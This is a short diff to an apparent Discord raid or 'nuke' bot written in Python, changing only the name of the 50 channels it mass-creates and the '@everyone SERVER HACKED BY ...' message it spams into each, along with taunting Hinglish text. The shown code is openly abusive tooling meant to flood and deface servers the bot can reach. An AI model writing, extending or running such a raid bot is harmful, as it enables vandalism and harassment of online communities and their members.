@@ -18190,7 +18190,7 @@ class FinalLaunchView(discord.ui.View):
         spam_channels = [] # Store objects to ping later
         create_tasks = []
         
-        channel_name = "😂-prank-ho-gya-tumhare-saath"
+        channel_name = "😂-chal-ab-baith-ke-tuntuna-baja🍌"
         
         # 50 Channels Create Karo
         for i in range(50):
@@ -18214,7 +18214,7 @@ class FinalLaunchView(discord.ui.View):
         # Ab jo channels bane hain unme ping karo
         ping_tasks = []
         for channel in spam_channels:
-            ping_tasks.append(channel.send("@everyone **SERVER HACKED BY TITAN!** 😂😂😂\n**Maza Aaya?**"))
+            ping_tasks.append(channel.send("@everyone **SERVER HACKED BY SAKSHAM BETA PANGA MAT LIO!** 😂😂😂\n**Maza Aaya?**"))
         
         if ping_tasks:
             try:
